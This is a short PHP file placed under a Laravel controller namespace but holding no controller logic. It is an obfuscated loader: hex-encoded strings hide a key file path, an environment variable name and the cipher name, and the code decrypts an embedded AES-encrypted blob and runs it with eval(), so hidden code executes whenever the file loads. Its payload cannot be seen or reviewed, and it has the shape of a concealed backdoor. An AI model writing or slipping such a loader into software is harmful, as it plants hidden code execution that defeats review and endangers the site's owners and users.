<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('PHudX21UOOpHNcc0sXuBiQ==');

$c=base64_decode(

'bHrbj84Jjr7mnRevBvBdnTLmpcAPFCVOHlFCQrjfASj7EN7PoX87SatTK1Zge8lWjVF9Wx6UMxdv' .
'yQRoMWlSjNYZrcL5zRUDoJ53USFNYwqJ28q2nGpSU8w1WV/h8Eer+w02HGjjI/Nv53i4jcr2nd0n' .
'XDIrR7MYB+gR9SihkFXn7gNhBItExRoZCHwGEzn/rzRFmkEdiTedKwPwTQIMHMgZUTubgJtxcwmO' .
'tVgz11HfI1TbF5nkdZ77eEKHrNysZUGxvu7OKBjzQBgG9Xoo8O206O/nCVKoB2LYDX3EPfInXG6g' .
'JxotZWaI+AJY9jBDQfZ659lGGUGtNI32rpZRtQuVtSBjB3xhFzHq1u20Zb0NXN2U4ii55z+qbjPH' .
'l+MvXHKYmq36Kd3SST4n+4JnXw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

